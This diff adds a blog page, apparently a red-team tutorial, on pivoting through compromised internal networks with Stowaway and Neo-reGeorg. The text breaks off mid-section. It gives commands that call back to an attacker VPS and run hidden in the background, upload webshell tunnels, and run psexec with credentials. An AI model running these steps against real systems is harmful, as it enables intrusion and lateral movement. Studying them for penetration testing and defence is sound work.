@@ -1,0 +1,578 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网隧道与代理技术 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="内网隧道技术概述在内网渗透中，攻击者通常面临以下网络限制：  目标机器不出网：无法直接连接到外部 C2 服务器 网络隔离：目标机器位于多层内网，无法直接访问 防火墙限制：只允许特定端口和协议通信 流量监控：网络流量被 IDS&#x2F;IPS 监控  隧道技术的作用：  突破网络限制：通过已控制的跳板机建立通信通道 流量加密：隐藏真实的通信内容 协议伪装：将恶意流量伪装成正常流量（HTTP、DNS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网隧道与代理技术">
+<meta property="og:url" content="https://www.52jl.top/2026/02/13/sd/index.html">
+<meta property="og:site_name" content="kenny&#39;s blog">
+<meta property="og:description" content="内网隧道技术概述在内网渗透中，攻击者通常面临以下网络限制：  目标机器不出网：无法直接连接到外部 C2 服务器 网络隔离：目标机器位于多层内网，无法直接访问 防火墙限制：只允许特定端口和协议通信 流量监控：网络流量被 IDS&#x2F;IPS 监控  隧道技术的作用：  突破网络限制：通过已控制的跳板机建立通信通道 流量加密：隐藏真实的通信内容 协议伪装：将恶意流量伪装成正常流量（HTTP、DNS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-08.webp">
+<meta property="article:published_time" content="2026-02-13T08:55:14.785Z">
+<meta property="article:modified_time" content="2026-02-13T08:55:14.793Z">
+<meta property="article:author" content="Kenny">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="隧道技术">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-08.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "内网隧道与代理技术",
+  "url": "https://www.52jl.top/2026/02/13/sd/",
+  "image": "https://www.52jl.top/img/covers/shinchan-cover-08.webp",
+  "datePublished": "2026-02-13T08:55:14.785Z",
+  "dateModified": "2026-02-13T08:55:14.793Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kenny",
+      "url": "https://www.52jl.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/13/sd/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网隧道与代理技术',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260213b"><meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<script>
+(() => {
+  try {
+    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
+    if (!isAutomation) return;
+    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
+    selectors.forEach((s) => {
+      document.querySelectorAll(s).forEach((el) => {
+        el.innerHTML = '<p>Content unavailable.</p>';
+      });
+    });
+  } catch (e) {}
+})();
+</script>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+<script>
+(() => {
+  try {
+    if (window.top !== window.self) {
+      window.top.location = window.self.location.href;
+      return;
+    }
+
+    const host = window.location.hostname;
+    const isLocal = host === 'localhost' || host === '127.0.0.1';
+    if (!isLocal && window.location.protocol === 'http:') {
+      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
+    }
+  } catch (e) {}
+})();
+</script>
+</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">内网隧道与代理技术</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">内网隧道与代理技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-13T08:55:14.785Z" title="发表于 2026-02-13 16:55:14">2026-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T08:55:14.793Z" title="更新于 2026-02-13 16:55:14">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="内网隧道技术概述"><a href="#内网隧道技术概述" class="headerlink" title="内网隧道技术概述"></a>内网隧道技术概述</h1><p>在内网渗透中，攻击者通常面临以下网络限制：</p>
+<ul>
+<li><strong>目标机器不出网</strong>：无法直接连接到外部 C2 服务器</li>
+<li><strong>网络隔离</strong>：目标机器位于多层内网，无法直接访问</li>
+<li><strong>防火墙限制</strong>：只允许特定端口和协议通信</li>
+<li><strong>流量监控</strong>：网络流量被 IDS&#x2F;IPS 监控</li>
+</ul>
+<p><strong>隧道技术的作用</strong>：</p>
+<ol>
+<li><strong>突破网络限制</strong>：通过已控制的跳板机建立通信通道</li>
+<li><strong>流量加密</strong>：隐藏真实的通信内容</li>
+<li><strong>协议伪装</strong>：将恶意流量伪装成正常流量（HTTP、DNS）</li>
+<li><strong>多层穿透</strong>：通过多级代理访问深层内网</li>
+</ol>
+<hr>
+<h1 id="反向代理（出网场景）"><a href="#反向代理（出网场景）" class="headerlink" title="反向代理（出网场景）"></a>反向代理（出网场景）</h1><h2 id="Stowaway-工具介绍"><a href="#Stowaway-工具介绍" class="headerlink" title="Stowaway 工具介绍"></a>Stowaway 工具介绍</h2><p>Stowaway 是一款功能强大的多级代理工具，支持：</p>
+<ul>
+<li><strong>反向连接</strong>：目标机器主动连接到 C2 服务器</li>
+<li><strong>多级代理</strong>：支持多层内网穿透</li>
+<li><strong>Socks5 代理</strong>：提供标准的 Socks5 代理服务</li>
+<li><strong>端口转发</strong>：支持本地和远程端口转发</li>
+<li><strong>文件传输</strong>：支持文件上传下载</li>
+</ul>
+<p><strong>项目地址</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ph4ntonn/Stowaway</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="单层反向代理"><a href="#单层反向代理" class="headerlink" title="单层反向代理"></a>单层反向代理</h2><h3 id="场景描述"><a href="#场景描述" class="headerlink" title="场景描述"></a>场景描述</h3><ul>
+<li><strong>攻击机</strong>：1.95.47.217（公网 VPS）</li>
+<li><strong>目标机器</strong>：192.168.3.10（内网机器，可出网）</li>
+</ul>
+<h3 id="实战操作"><a href="#实战操作" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>第一步：在攻击机启动 Admin 端</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x linux_x64_admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动监听（端口 5652，密钥 243142）</span></span><br><span class="line">./linux_x64_admin -l 5652 -s 243142</span><br></pre></td></tr></table></figure>
+
+<p><img src="/suidao/1.webp" loading='lazy'></p>
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li><code>-l</code>：监听端口</li>
+<li><code>-s</code>：连接密钥（用于认证）</li>
+</ul>
+<p><strong>第二步：在目标机器运行 Agent</strong></p>
+<p><strong>Windows 目标</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 前台运行</span><br><span class="line">agent.exe -c <span class="number">1</span>.<span class="number">95</span>.<span class="number">47</span>.<span class="number">217</span>:<span class="number">5652</span> -s <span class="number">243142</span> --reconnect <span class="number">10</span></span><br><span class="line"></span><br><span class="line"># 后台运行（推荐）</span><br><span class="line"><span class="built_in">start</span> /B agent.exe -c <span class="number">1</span>.<span class="number">95</span>.<span class="number">47</span>.<span class="number">217</span>:<span class="number">5652</span> -s <span class="number">243142</span> --reconnect <span class="number">10</span> &gt; <span class="built_in">NUL</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Linux 目标</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前台运行</span></span><br><span class="line">./linux_x86_agent -c 1.95.47.217:5652 -s 243142 --reconnect 10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后台运行</span></span><br><span class="line"><span class="built_in">nohup</span> ./linux_x86_agent -c 1.95.47.217:5652 -s 243142 --reconnect 10 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li><code>-c</code>：连接到的服务器地址和端口</li>
+<li><code>-s</code>：连接密钥</li>
+<li><code>--reconnect</code>：断线重连间隔（秒）</li>
+</ul>
+<p><strong>第三步：在 Admin 端设置 Socks5 代理</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择节点 0（第一个连接的 Agent）</span></span><br><span class="line">use 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 Socks5 代理（监听本地 1080 端口）</span></span><br><span class="line">socks 1080</span><br></pre></td></tr></table></figure>
+
+<p><img src="/suidao/2.webp" loading='lazy'></p>
+<p><strong>第四步：配置代理工具</strong></p>
+<p><strong>使用 Proxifier</strong>：</p>
+<ol>
+<li>打开 Proxifier</li>
+<li>添加代理服务器：<code>127.0.0.1:1080</code>，类型：Socks5</li>
+</ol>
+<p><img src="/suidao/3.webp" loading='lazy'></p>
+<ol start="3">
+<li>配置代理规则（只代理内网 IP）：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.*.*</span><br><span class="line">172.*.*.*</span><br><span class="line">10.*.*.*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/suidao/4.webp" loading='lazy'></p>
+<ol start="4">
+<li>设置应用程序代理（如 Chrome）：</li>
+</ol>
+<p><img src="/suidao/5.webp" loading='lazy'></p>
+<p><strong>第五步：验证代理</strong></p>
+<p><strong>访问内网 Web 应用</strong>：</p>
+<p>通过浏览器访问内网 IP，如 <code>http://192.168.3.100</code></p>
+<p><strong>连接内网数据库</strong>：</p>
+<p><img src="/suidao/6.webp" loading='lazy'></p>
+<p><strong>使用 Burp Suite 代理</strong>：</p>
+<p><img src="/suidao/7.webp" loading='lazy'></p>
+<hr>
+<h2 id="使用-Proxychains（Linux）"><a href="#使用-Proxychains（Linux）" class="headerlink" title="使用 Proxychains（Linux）"></a>使用 Proxychains（Linux）</h2><p><strong>安装 Proxychains</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install proxychains4 -y</span><br></pre></td></tr></table></figure>
+
+<p><strong>配置 Proxychains</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑配置文件</span></span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在文件末尾添加</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用 Proxychains</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过代理执行命令</span></span><br><span class="line">proxychains nmap -sT 192.168.3.0/24</span><br><span class="line">proxychains curl http://192.168.3.100</span><br><span class="line">proxychains ssh root@192.168.3.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过代理使用 Impacket 工具</span></span><br><span class="line">proxychains impacket-psexec administrator:Pass123@192.168.3.10</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Stowaway-高级功能"><a href="#Stowaway-高级功能" class="headerlink" title="Stowaway 高级功能"></a>Stowaway 高级功能</h2><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>本地端口转发</strong>（将远程端口映射到本地）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 Admin 端执行</span></span><br><span class="line">use 0</span><br><span class="line">forward 1 3389 192.168.3.10 3389</span><br></pre></td></tr></table></figure>
+
+<p><strong>说明</strong>：将目标机器的 3389 端口转发到本地 3389 端口</p>
+<p><strong>远程端口转发</strong>（将本地端口映射到远程）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 Admin 端执行</span></span><br><span class="line">use 0</span><br><span class="line">rforward 1 8080 127.0.0.1 80</span><br></pre></td></tr></table></figure>
+
+<p><strong>说明</strong>：将本地 80 端口转发到目标机器的 8080 端口</p>
+<hr>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p><strong>上传文件到目标机器</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">upload /path/to/local/file.txt C:\Windows\Temp\file.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>从目标机器下载文件</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">download C:\Windows\Temp\file.txt /path/to/local/file.txt</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="交互式-Shell"><a href="#交互式-Shell" class="headerlink" title="交互式 Shell"></a>交互式 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="正向代理（不出网场景）"><a href="#正向代理（不出网场景）" class="headerlink" title="正向代理（不出网场景）"></a>正向代理（不出网场景）</h1><h2 id="Neo-reGeorg-工具介绍"><a href="#Neo-reGeorg-工具介绍" class="headerlink" title="Neo-reGeorg 工具介绍"></a>Neo-reGeorg 工具介绍</h2><p>Neo-reGeorg 是 reGeorg 的升级版，通过 WebShell 建立 Socks 代理隧道。</p>
+<p><strong>适用场景</strong>：</p>
+<ul>
+<li>目标机器不出网</li>
+<li>已获取 WebShell 权限</li>
+<li>Web 服务器可以访问内网</li>
+</ul>
+<p><strong>项目地址</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/L-codes/Neo-reGeorg</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="实战操作-1"><a href="#实战操作-1" class="headerlink" title="实战操作"></a>实战操作</h2><p><strong>第一步：生成隧道脚本</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py generate -k password</span><br></pre></td></tr></table></figure>
+
+<p><img src="/suidao/8.webp" loading='lazy'></p>
+<p><strong>生成的文件</strong>：</p>
+<ul>
+<li><code>tunnel.aspx</code>：ASP.NET WebShell</li>
+<li><code>tunnel.ashx</code>：ASP.NET Handler</li>
+<li><code>tunnel.jsp</code>：Java WebShell</li>
+<li><code>tunnel.jspx</code>：Java XML WebShell</li>
+<li><code>tunnel.php</code>：PHP WebShell</li>
+</ul>
+<p><strong>第二步：上传隧道脚本到 Web 目录</strong></p>
+<p>根据目标 Web 服务器类型，选择对应的脚本上传：</p>
+<ul>
+<li><strong>IIS + ASP.NET</strong>：上传 <code>tunnel.aspx</code></li>
+<li><strong>Tomcat + Java</strong>：上传 <code>tunnel.jsp</code></li>
+<li><strong>Apache + PHP</strong>：上传 <code>tunnel.php</code></li>
+</ul>
+<p>确保脚本可以通过浏览器访问，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.5.130/tunnel.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/suidao/9.webp" loading='lazy'></p>
+<p><strong>第三步：启动本地代理客户端</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py -k password -p 8099 -u http://192.168.5.130/tunnel.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li><code>-k</code>：连接密钥（与生成时一致）</li>
+<li><code>-p</code>：本地 Socks5 代理端口</li>
+<li><code>-u</code>：隧道脚本的 URL</li>
+</ul>
+<p><img src="/suidao/10.webp" loading='lazy'></p>
+<p><strong>第四步：配置代理</strong></p>
+<p>与反向代理相同，配置 Proxifier 或 Proxychains：</p>
+<ul>
+<li>代理地址：<code>127.0.0.1:8099</code></li>
+<li>代理类型：Socks5</li>
+</ul>
+<p><strong>注意</strong>：由于是正向代理，代理服务器地址是本机 <code>127.0.0.1</code>，而不是目标机器 IP。</p>
+<hr>
+<h2 id="Neo-reGeorg-高级配置"><a href="#Neo-reGeorg-高级配置" class="headerlink" title="Neo-reGeorg 高级配置"></a>Neo-reGeorg 高级配置</h2><h3 id="使用-HTTP-代理"><a href="#使用-HTTP-代理" class="headerlink" title="使用 HTTP 代理"></a>使用 HTTP 代理</h3><p>如果攻击机需要通过 HTTP 代理访问目标 WebShell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py -k password -p 8099 -u http://192.168.5.130/tunnel.php --proxy http://proxy.company.com:8080</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="自定义-HTTP-头"><a href="#自定义-HTTP-头" class="headerlink" title="自定义 HTTP 头"></a>自定义 HTTP 头</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py -k password -p 8099 -u http://192.168.5.130/tunnel.php -H <span class="string">&quot;X-Forwarded-For: 192.168.1.1&quot;</span> -H <span class="string">&quot;User-Agent: Mozilla/5.0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Cookie-认证"><a href="#Cookie-认证" class="headerlink" title="Cookie 认证"></a>Cookie 认证</h3><p>如果 WebShell 需要 Cookie 认证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py -k password -p 8099 -u http://192.168.5.130/tunnel.php -c <span class="string">&quot;PHPSESSID=abc123; auth=token456&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="多级代理（多层内网穿透）"><a href="#多级代理（多层内网穿透）" class="headerlink" title="多级代理（多层内网穿透）"></a>多级代理（多层内网穿透）</h1><h2 id="场景描述-1"><a href="#场景描述-1" class="headerlink" title="场景描述"></a>场景描述</h2><p>假设网络拓扑如下：</p>
+<ul>
+<li><strong>攻击机</strong>：1.95.47.217（公网 VPS）</li>
+<li><strong>跳板机 A</strong>：192.168.158.132（公网 IP + 内网 IP）</li>
+<li><strong>跳板机 B</strong>：192.168.158.144 + 192.168.3.11（双网卡）</li>
+<li><strong>目标机器</strong>：192.168.3.12（深层内网）</li>
+</ul>
+<p><img src="/suidao/11.webp" loading='lazy'></p>
+<p><strong>目标</strong>：从攻击机访问 192.168.3.12</p>
+<hr>
+<h2 id="实战操作-2"><a href="#实战操作-2" class="headerlink" title="实战操作"></a>实战操作</h2><p><strong>第一步：建立第一层代理</strong></p>
+<p>在攻击机启动 Admin 端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 5652 -s 243142</span><br></pre></td></tr></table></figure>
+
+<p>在跳板机 A（192.168.158.132）运行 Agent：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -c 1.95.47.217:5652 -s 243142 --reconnect 10</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步：在跳板机 A 上启动监听</strong></p>
+<p>在 Admin 端执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择节点 0（跳板机 A）</span></span><br><span class="line">use 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在跳板机 A 上启动监听（端口 7732）</span></span><br><span class="line">listen</span><br><span class="line"><span class="comment"># 输入节点 ID：1</span></span><br><span class="line"><span class="comment"># 输入监听端口：7732</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第三步：从跳板机 B 连接到跳板机 A</strong></p>
+<p>在跳板机 B（192.168.158.144）运行 Agent：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -c 192.168.158.132:7732 -s 243142 --reconnect 10</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>：这里连接的是跳板机 A 的 IP（192.168.158.132），而不是攻击机的 IP。</p>
